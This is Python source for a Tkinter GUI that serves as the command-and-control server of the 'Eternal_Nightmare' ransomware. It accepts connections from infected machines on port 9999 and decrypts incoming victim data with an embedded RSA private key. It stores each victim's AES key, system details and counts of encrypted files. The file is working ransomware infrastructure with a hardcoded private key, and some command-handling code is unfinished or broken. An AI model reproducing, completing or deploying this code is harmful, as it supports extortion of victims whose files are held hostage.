from ast import Pass
from http import server
from mimetypes import common_types
from socket import *
from asyncio import subprocess #line:1
import threading #line:11
from tkinter import dnd, messagebox #line:12
from tkinter import *#line:18
import time
import tkinter.filedialog as fd
import tkinter .messagebox as msgbox #line:24
import tkinter .font #line:25
import os ,random ,struct
from warnings import WarningMessage #line:29
from Cryptodome.Cipher import AES #line:32
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import AES, PKCS1_OAEP
import sys #line:38
import subprocess
import threading #line:11
import struct
s=socket()

__all__=[]

server_gui =Tk ()#line:49
server_ok=0
aa =None #line:50
sf4 =None #line:51
aos =os .getcwd ()#line:52
aioss =aos .split ("\\")[2 ]#line:53
aiosss ="C:\\Users\\"+aioss #line:54
server_gui .title ("Eternal_Nightmare-RansomWare_C&C-Server")#line:55
server_gui .geometry ('1000x1050-800+250')#line:56
server_gui .resizable (width =0 ,height =0 )#line:57
server_gui .configure (bg ="black")#line:58
server_gui .wm_attributes ("-topmost",1 )#line:60
font2 =tkinter .font .Font (family ="Consolas",size =18 )#line:61
font3 =tkinter .font .Font (family ="Consolas",size =14 )#line:62
font1 =tkinter .font .Font (family ="Consolas",size =19 )#line:62
font4 =tkinter .font .Font (family ="Consolas",size =16 )#line:62
font0=tkinter .font .Font (family ="Consolas",size =25 )#line:62

def on_closing ():#line:76
	if server_ok==1:
		ask=messagebox.askquestion("Eternal_Nightmare-RansomWare_C&C-Server","Server is still running. Shutting down now may result in fatal errors. Are you sure you want to quit?",icon = 'warning')
		if ask == 'yes':
			server_gui.destroy()
			sys.exit(-1)
	else:
		server_gui.destroy()
		sys.exit(0)

server_gui .protocol ("WM_DELETE_WINDOW",on_closing)

canvas =Canvas (server_gui ,width =570 ,height =274 ,bd =0 ,highlightthickness =0 )#line:97

lb  =Listbox   (server_gui ,width =110 ,height =36  ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="green"                            ,relief ="groove",bd =4 )#line:99
lb2 =Listbox   (server_gui ,width =30  ,height =51  ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="green",xscrollcommand ="Scrollbar",relief ="groove",bd =3 )#line:101
lb3 =Listbox   (server_gui ,width =110 ,height =15  ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="green",xscrollcommand ="Scrollbar",relief ="groove",bd =3 )#line:101

scrollbar =Scrollbar (server_gui ,orient ="horizontal",command =lb2 .xview )#line:103

canvas .place ()#line:98

lb .place (x =0 ,y =50 )#line:100
lb2.place (x =780 ,y =50 )#line:102
lb3.place (x =0 ,y =743 )#line:102

scrollbar .place ()#line:104


l =Label(server_gui,bg ="black",fg ="green",width =55 ,text="Eternal_Nightmare-RansomWare_C&C-Server",relief ="groove",bd =3,font=font1)
l2=Label(server_gui,bg ="black",fg ="green",width =55 ,text="Server_Log"                             ,relief ="groove",bd =3,font=font1)
l3=Label(server_gui,bg ="black",fg ="green",width =15 ,text="User_List"                              ,relief ="groove",bd =3,font=font1)

l .place(x =0 ,y =6 )
l2.place(x =0 ,y =697 )
l3.place(x=780,y =6 )

E =Entry(server_gui,bg ="black",fg ="green",width =55 ,relief ="groove",font =font1 ,bd =4 )#line:105
E .place (x =0 ,y =1000 )#line:106

user={}
address=[]

key2="""-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----"""

private_key = RSA.import_key(key2.encode())
cipher_rsa = PKCS1_OAEP.new(private_key)
usercount=0
def start_server():
	global server_ok
	lb3.insert(END,"Server : Initialize socket settings...")
	#try:
	s.bind(("0.0.0.0",9999))
	#except:
	lb3.insert(END,"Server : ")
	lb3.insert(END,"Server : Binding...")
	server_ok=1
	s.listen(0)
	d =threading .Thread (target =add_user ).start ()#line:394

def add_user():
	global server_ok
	global user
	global addr
	global address
	global usercount
	while True:
		lb3.insert(END,"Server : Ready")
		c,addr=s.accept()
		address.append(addr)
		lb3.insert(END,"Connected : "+str(addr))
		lb3.insert(END,"User_set : "+str(addr))
		lb2.insert(END,str(addr))
		print(address)
		ndata=""
		dndata=bytes()
		ndata=c.recv(4)
		rl=int(str(struct.unpack("I",ndata)).split(",")[0].split("(")[1])
		ndata=0
		print(rl)
		for i in range(int(rl/2048)):
			lb3.insert(END,"Downloading "+str(addr)+"... : "+str(2048*i/rl*100)+" %"+" Done...")
			ndata=c.recv(2048)
			dndata+=ndata
			lb3.delete(END)
		lb3.insert(END,"Downloading "+str(addr)+" Data... : "+"100 % Done...")
		lb3.insert(END,"Download success!")
		length=1024
		dndata= [bytes(dndata)[z:z+length] for z in range(0, len(dndata), length)]
		dndata2=bytes()
		for x in range(len(dndata)):
			lb3.insert(END,"Decrypting "+str(addr)+" Data... : "+str(1*x/len(dndata)*100)+" %"+" Done...")
			dndata2+=cipher_rsa.decrypt(dndata[x])
			lb3.delete(END)
		lb3.insert(END,"Decrypting "+str(addr)+" Data... : "+"100 % Done...")
		dndata2=dndata2.decode().split("|")
		dndata2=str(dndata2).split(",")
		lb3.insert(END,"User "+str(addr)+" Decrypting successful!")
		user[addr]=dndata2
		usercount+=1
		for y in range(9):
			lb.insert(END,str(dndata2[y]))
		lb.insert(END,"\n")
		lb.insert(END,"\n")
		f=open("C:\\Users\\Eternal_Nightmare0\\Desktop\\Eternal_Nightmare-RansomWare\\"+str(addr),"wb")
		for u in range(len(dndata)):
			lb3.insert(END,"Saveing "+str(addr)+" Data... : "+str(1*u/len(dndata)*100)+" %"+" Done...")
			f.write(dndata[u])
			lb3.delete(END)
		lb3.insert(END,"Saveing "+str(addr)+" Data... : "+"100 % Done...")
		f.close()
		lb3.insert(END,"User "+str(addr)+" Storage Complete!")
		dndata2=bytes()

def starting():
    d =threading .Thread (target =start_server ).start ()#line:394

#def progress():
	#for i in range():
		#lb3.insert(END,"Download in progress...(%) : "+str(addr))

def stop_server():
	global server_ok
	global user
	global addr
	global address
	global usercount
	try:
		for r in range(usercount):
			lb3.insert(0,"Closing session... : "+str(address[r]))
			del user[address[r]]
			address.remove(address[r])
	except:
		lb3.insert(0,"Closed session")
	#s.close()
	server_ok=0
	lb3.insert(0,"Session ended")
	lb3.insert(0,"Server : Stop")
	d3 =threading .Thread (target =add_user ).join ()#line:394
	d4 =threading .Thread (target =start_server ).join ()#line:394
	d5 =threading .Thread (target =starting ).join ()#line:394


def Load_Flie():
	global server_ok
	global user
	global addr
	global address
	global usercountW
	try:
		Files=fd.askopenfilename()
		sf=list((str(Files).split("/")))
		lb3.insert(END,"Load Files : "+str(sf[-1]))
		Files=(open(Files,"rb").read())
		length=1024
		loaddata= [bytes(Files)[p:p+length] for p in range(0, len(Files), length)]
		lb3.insert(END,"User_set : "+str(sf[-1]))
		dndata3=[]
		for q in range(len(loaddata)):
			lb3.insert(END,"Decrypting "+sf[-1]+" Data... : "+str(1*q/len(loaddata)*100)+" %"+" Done...")
			dndata3+=cipher_rsa.decrypt(loaddata[q]).decode().split("|")
			lb3.delete(END)
		lb3.insert(END,"Decrypting "+sf[-1]+" Data... : "+"100 % Done...")
		address.append(str(sf[-1]))
		user[str(sf[-1])]=dndata3
		lb2.insert(END,str(sf[-1]))
		for h in range(8):
			lb.insert(END,str(dndata3[h]))
		lb.insert(END,"\n")
		lb.insert(END,"\n")
	except:
		lb3.insert(END,"The file type or encryption format is incorrect.")

def Loading_File():
	d =threading .Thread (target =Load_Flie ).start ()

def clear ():#line:142
    lb .delete (0 ,END )#line:143
    msgbox .showinfo ("Clear","Clear done!")#line:145

def Server_Settings():
	global CheckVar1
	global CheckVar3
	global CheckVar3
	global CheckVar4
	global CheckVar5
	global CheckVar6
	Settings=Toplevel(server_gui) 
	Settings.title("Server_Settings")
	Settings.geometry ('556x600+950+400')#line:56
	Settings.configure (bg ="black")#line:58
	Settings.wm_attributes ("-topmost",1)#line:60
	Settings.configure(bd=10)
	CheckVar1=IntVar()
	CheckVar2=IntVar()
	CheckVar3=IntVar()
	CheckVar4=IntVar()
	CheckVar5=IntVar()
	CheckVar6=IntVar()
	CheckVar7=IntVar()
	lb4=Listbox (Settings ,width =25 ,height =20 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="green",relief ="groove",bd =4 )#line:99
	lb4.place (x =-7 ,y =250 )#line:100
	lb5=Listbox (Settings ,width =15 ,height =20 ,selectmode ="extended",yscrollcommand ="Scrollbar",bg ="black",fg ="green",relief ="groove",bd =4 )#line:99
	lb5.place (x =185 ,y =250 )#line:100
	l1=Label(Settings,bg ="black",fg ="green",text="[Server_Settings]",width =42,relief ="groove",bd =3,font=font1)
	l1.place(x =-10 ,y =-9 )
	l2=Label(Settings,bg ="black",fg ="green",text="[list of allowed users & ports]",width =42,relief ="groove",bd =3,font=font1)
	l2.place(x =-10 ,y =200 )
	E2 =Entry(Settings,bg ="black",fg ="green",width =8 ,relief ="groove",font =font1 ,bd =4 )#line:105
	#E2 .place (x =160 ,y =30 )#line:106
	E3 =Entry(Settings,bg ="black",fg ="green",width =8 ,relief ="groove",font =font1 ,bd =4 )#line:105
	#E3 .place (x =160 ,y =70 )#line:106
	E4 =Entry(Settings,bg ="black",fg ="green",width =8 ,relief ="groove",font =font1 ,bd =4 )#line:105
	#E4 .place (x =160 ,y =110 )#line:106
	def all_user():
		if CheckVar3.get()==1:
			ch3.toggle()
			lb3.insert(END,"Server Settings Changed: Allow server access for all users")
		else:
			ch1.toggle()
			user_set=0
	def deall_user():
		if CheckVar1.get()==1:
			ch1.toggle()
			lb3.insert(END,"Server Settings Changed: Block server access from all users")
		else:
			ch3.toggle()
	def all_port():
		if CheckVar2.get()==1:
			ch4.toggle()
			lb3.insert(END,"Server Settings Changed: Allow server access on all ports")
		else:
			ch2.toggle()
	def deall_port():
		if CheckVar4.get()==1:
			ch2.toggle()
			lb3.insert(END,"Server Settings Changed: Block server access on all ports")
		else:
			ch4.toggle()
	def set_user():
		if CheckVar5.get()!=1:
			ch1.toggle()
			ch3.toggle()
			su=E3.get()
		else:
			ch1.toggle()
			ch3.toggle()
			lb3.insert(END,"Server Settings Changed: Set who can access the server")
	def set_port():
		if CheckVar6.get()!=1:
			ch2.toggle()
			ch4.toggle()
			sp=E2.get()
		else:
			ch2.toggle()
			ch4.toggle()
			lb3.insert(END,"Server Settings Changed: Set the port to access the server")
	def max_user():
		lb3.insert(END,"Server Settings Changed: Set the maximum number of accessible users")
		pass
	ch1=Checkbutton(Settings,fg ="green",bg ="black",text="Allow server access for all users",variable=CheckVar1,command=all_user)
	ch2=Checkbutton(Settings,fg ="green",bg ="black",text="Allow server access on all ports",variable=CheckVar2,command=all_port)
	ch3=Checkbutton(Settings,fg ="green",bg ="black",text="Block server access from all users",variable=CheckVar3,command=deall_user)
	ch4=Checkbutton(Settings,fg ="green",bg ="black",text="Block server access on all ports",variable=CheckVar4,command=deall_port)
	ch5=Checkbutton(Settings,fg ="green",bg ="black",text="Set who can access the server",variable=CheckVar5,command=set_user)
	ch6=Checkbutton(Settings,fg ="green",bg ="black",text="Set the port to access the server",variable=CheckVar6,command=set_port)
	ch7=Checkbutton(Settings,fg ="green",bg ="black",text="Set the maximum number of accessible users",variable=CheckVar7,command=max_user)
	ch1.place(x =-5 ,y =30 )
	ch2.place(x =-5 ,y =60 )
	ch3.place(x =-5 ,y =90 )
	ch4.place(x =-5 ,y =120 )
	ch5.place(x =225 ,y =35 )
	ch6.place(x =225 ,y =76  )
	ch7.place(x =225 ,y =116  )

	
	ch1.toggle()
	ch2.toggle()
	ask=messagebox.askokcancel("Server_Settings","If the server's maximum user limit is not set or is set to 0, it is regarded as unlimited.You will also need to restart the server for the settings to take effect.",icon = 'warning')
	print(ask)
	if ask == True:
		Settings.wm_attributes ("-topmost",1)#line:60
	else:
		Settings.destroy()

def User_Selectiton():
	global user
	global address
	s=str(lb2.curselection())
	s2=s.split(',')[0]
	s2=int(s2.split('(')[1])
	s3=str(address[s2])

	for b,n in  user.items ():
		if s3==str(b):
			print(n)
			print(b)
			for v in range(9):
				lb.insert(END,str(n[v]))
			lb.insert(END,"\n")
			lb.insert(END,"\n")
			lb3.insert(END,"Load User data : "+str(b))
		else:
			lb3.insert(END,"No users found matching this ID")

def Help():
	messagebox.showinfo("Helper","Server : It is a C&C server of the eternal nightmare ransomware."+"\n"+"Server_Start : Start the server's service"+"\n"+"Server_Stop : Shut down all services on the server"+"\n"+"Load_Flie : Load saved user file"+"\n"+"Clear : Clean up server logs"+"\n"+"Server_Settings : Change server settings"+"\n"+"Help : helper"+"\n"+"Reset : Initialize all variables on the server"+"\n"+"Server_Commands : Saved user data can be loaded using commands")

def Reset():
	global user
	global address
	global addr
	global server_ok
	user={}
	address=[]
	addr=None
	server_ok=0
	s.close()
	messagebox.showinfo("Reset","Initialized all variables")

def Server_Command():#기능 수정중
	global Command
	Command=str(E.get())
	Command=list(Command.split("/"))[0:2]
	print(Command)
	commandlist=[AESkey(x),RHK(x),cpu_count(x),system(x),processor(x),version(x),vector(x),encf_count(x),orgf_count(x)]
	for x in address:
		print(x)
		for y in range(9):
			print(y)
			if Command[0]==commandlist[y]:
				if Command[1]==str(x):
					locals()[commandlist[y]]()
		else:
			lb3.insert(END,"There is no ID corresponding to the user list. Please check the command")
			break

def AESkey(ID):
	for x,y in user.items():
		break
	if str(ID)==str(x):
		lb3.insert(END,"User's "+str(ID)+str(y[0]))
	else:
		lb3.insert(END,"The user's information could not be found. Please check the loaded file or transmitted data.")
def RHK(ID):
	for x,y in user.items():
		break
	if str(ID)==str(x):
		lb3.insert(END,"User's "+str(ID)+str(y[1]))
	else:
		lb3.insert(END,"The user's information could not be found. Please check the loaded file or transmitted data.")
def cpu_count(ID):
	for x,y in user.items():
		break
	if str(ID)==str(x):
		lb3.insert(END,"User's "+str(ID)+str(y[2]))
	else:
		lb3.insert(END,"The user's information could not be found. Please check the loaded file or transmitted data.")
def system(ID):
	for x,y in user.items():
		break
	if str(ID)==str(x):
		lb3.insert(END,"User's "+str(ID)+str(y[3]))
	else:
		lb3.insert(END,"The user's information could not be found. Please check the loaded file or transmitted data.")
def processor(ID):
	for x,y in user.items():
		break
	if str(ID)==str(x):
		lb3.insert(END,"User's "+str(ID)+str(y[4]))
	else:
		lb3.insert(END,"The user's information could not be found. Please check the loaded file or transmitted data.")
def version(ID):
	for x,y in user.items():
		break
	if str(ID)==str(x):
		lb3.insert(END,"User's "+str(ID)+str(y[6]))
	else:
		lb3.insert(END,"The user's information could not be found. Please check the loaded file or transmitted data.")
def vector(ID):
	for x,y in user.items():
		break
	if str(ID)==str(x):
		lb3.insert(END,"User's "+str(ID)+str(y[10]))
	else:
		lb3.insert(END,"The user's information could not be found. Please check the loaded file or transmitted data.")
def encf_count(ID):
	for x,y in user.items():
		break
	if str(ID)==str(x):
		lb3.insert(END,"User's "+str(ID)+str(y[7]))
	else:
		lb3.insert(END,"The user's information could not be found. Please check the loaded file or transmitted data.")
def orgf_count(ID):
	for x,y in user.items():
		break
	if str(ID)==str(x):
		lb3.insert(END,"User's "+str(ID)+str(y[8]))
	else:
		lb3.insert(END,"The user's information could not be found. Please check the loaded file or transmitted data.")

Server_Start   = Button (server_gui  ,text ="Server_Start"       ,bg ="black"  ,fg ="green"   ,relief ="groove"  ,font =font2  ,bd =3 ,command=starting)#line:194
Server_Stop    = Button (server_gui  ,text ="Server_Stop"        ,bg ="black"  ,fg ="green"   ,relief ="groove"  ,font =font2  ,bd =3 ,command=stop_server)#line:194
Loading_File   = Button (server_gui  ,text ="Load_Flie"          ,bg ="black"  ,fg ="green"   ,relief ="groove"  ,font =font2  ,bd =3 ,command=Loading_File)#line:198
Clear          = Button (server_gui  ,text ="Cls"                ,bg ="black"  ,fg ="green"   ,relief ="groove"  ,font =font2  ,bd =3 ,command=clear)#line:196
Server_Settings= Button (server_gui  ,text ="Server_Settings"    ,bg ="black"  ,fg ="green"   ,relief ="groove"  ,font =font2  ,bd =3 ,command=Server_Settings)#line:194
User_Selection = Button (server_gui  ,text ="User_Selection"     ,bg ="black"  ,fg ="green"   ,relief ="groove"  ,font =font1  ,bd =3 ,command=User_Selectiton)#line:197
Help           = Button (server_gui  ,text ="[Help]"             ,bg ="black"  ,fg ="green"   ,relief ="groove"  ,font =font2  ,bd =3 ,command=Help)#line:195
Reset          = Button (server_gui  ,text ="[Reset]"            ,bg ="black"  ,fg ="green"   ,relief ="groove"  ,font =font2  ,bd =3 ,command=Reset)#line:195
Server_Command = Button (server_gui  ,text ="Server_Command"     ,bg ="black"  ,fg ="green"   ,relief ="groove"  ,font =font1  ,bd =3 ,command=Server_Command)#line:195


Server_Start   .place (x =0   ,y =638 )#line:199
Server_Stop    .place (x =180 ,y =638 )#line:201
Loading_File   .place (x =347 ,y =638 )#line:203
Clear          .place (x =488 ,y =638 )#line:201
Server_Settings.place (x =562 ,y =638 )#line:200
User_Selection .place (x =780 ,y =886 )#line:202
Help           .place (x =780 ,y =940 )#line:200
Reset          .place (x =886 ,y =940 )#line:200
Server_Command .place (x =780 ,y =993 )#line:200

server_gui.mainloop()
